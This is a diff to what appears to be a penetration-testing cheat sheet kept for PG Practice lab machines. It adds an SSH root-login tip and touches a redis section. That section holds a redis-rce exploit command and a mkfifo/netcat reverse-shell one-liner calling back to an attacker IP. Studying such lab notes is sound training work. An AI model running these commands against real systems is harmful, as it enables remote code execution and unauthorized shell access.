@@ -445,6 +445,9 @@ chmod 600 ~/.ssh/authorized_keys
 
 #On Attacker machine
 ssh username@target_ip #enter password if you gave any
+
+# If ssh error Too many authentication failures
+ssh -o IdentitiesOnly=yes -i /home/remi/.ssh/keys/root root@127.0.0.1 # Boolean PG Practice
 ```
 
 ## File Transfers
@@ -2634,10 +2637,10 @@ whoami
 #Got root shell
 ```
 ## redis 6379, /usr/local/bin/redis-status privesc
-- In [redis-rce](https://github.com/Ridter/redis-rce) redis running on the linux machine to RCE
-- ANother way to get initial shell [redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server) it will give the intiall shell
+- In [redis-rce](https://github.com/Ridter/redis-rce) redis running on the linux machine to RCE, from PG Practice Blackgate
+- Another way to get initial shell [redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server) it will give the initial shell
 ```bash
-# redis-rce
+# redis-rce 
 python3 redis-rce.py -r 192.168.197.176 -p 6379 -L 192.168.45.171 -f exp_lin.so # Once we get the shell
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.171 1122 >/tmp/f # It allowed one command or 2 commands, then listen kali linux with netcat
 # sudo -l privileges with /usr/local/bin/redis-status privilege escalation redis
